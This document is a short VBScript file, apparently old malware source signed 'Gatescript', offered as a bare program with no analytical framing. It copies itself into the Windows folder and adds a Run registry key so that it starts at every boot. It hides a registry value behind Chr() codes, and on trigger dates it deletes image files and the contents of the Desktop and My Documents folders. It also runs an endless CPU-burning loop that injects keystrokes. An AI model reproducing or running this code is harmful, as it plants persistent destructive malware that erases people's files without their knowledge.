'KAVAR
ON ERROR RESUME NEXT
Dim DONOTEDITcmsgchxxrl
Dim DONOTEDITcborrchxxrl
Dim DONOTEDITccolchxxrl
Dim zchxxrl
Dim DONOTEDITnarchxxrl
Dim DONOTEDITdichxxrl
Dim DONOTEDITvalchxxrl
Dim DONOTEDITsenchxxrl
Dim DONOTEDITtecchxxrl
Dim vtecchxxrl
Dim Cochxxrl
Set DONOTEDITwshchxxrl = CreateObject("WScript.Shell")
Set DONOTEDITfsochxxrl= CreateObject("scripting.filesystemobject")
DONOTEDITfsochxxrl.copyfile wscript.scriptfullname,DONOTEDITfsochxxrl.GetSpecialFolder(0) & "\kruls1.vbs"
DONOTEDITwshchxxrl.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\kruls","wscript.exe " & DONOTEDITfsochxxrl.GetSpecialFolder(0) & "\kruls1.vbs %"
DONOTEDITwshchxxrl.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
If month(now) = 9 and day(now) = 10 Then
msgbox "you should see this funny pic"
End If
If month(now) = 8 and day(now) = 10 Then
DONOTEDITfsochxxrl.deletefile ("C:\Windows\*.jpg")
DONOTEDITfsochxxrl.deletefile ("C:\Windows\*.bmp")
DONOTEDITfsochxxrl.deletefile ("C:\Windows\Escritorio\*.*")
DONOTEDITfsochxxrl.deletefile ("C:\misdoc~1\*.*")
End If
DONOTEDITvalchxxrl = 0
DONOTEDITtecchxxrl = 0
dichxxrl()
Function dichxxrl()
On Error Resume Next
Do
DONOTEDITtecchxxrl = DONOTEDITtecchxxrl + 1
If DONOTEDITtecchxxrl = 700000 Then
If month(now) = 7 and day(now) = 7 Then
DONOTEDITwshchxxrl.sendkeys "Here we go!"
End If
DONOTEDITtecchxxrl = 0
End If
Loop
End Function
'Gatescript - Geocities.com/gatescript
